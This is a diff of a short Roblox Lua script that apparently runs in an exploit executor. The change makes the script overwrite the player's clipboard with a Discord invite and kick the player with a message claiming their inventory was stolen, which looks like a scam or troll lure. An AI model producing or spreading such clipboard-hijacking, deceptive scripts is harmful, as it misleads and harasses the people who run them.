@@ -1,4 +1,4 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-setclipboard("https://youtu.be/H3m90Cse0-E")
-player:Kick("Outdated script, new script link copied to clipboard")
+setclipboard("https://discord.gg/wfGrqNgTxG") -- discord server
+player:Kick("🥀 Your inv got stolen by pedroga 😱")
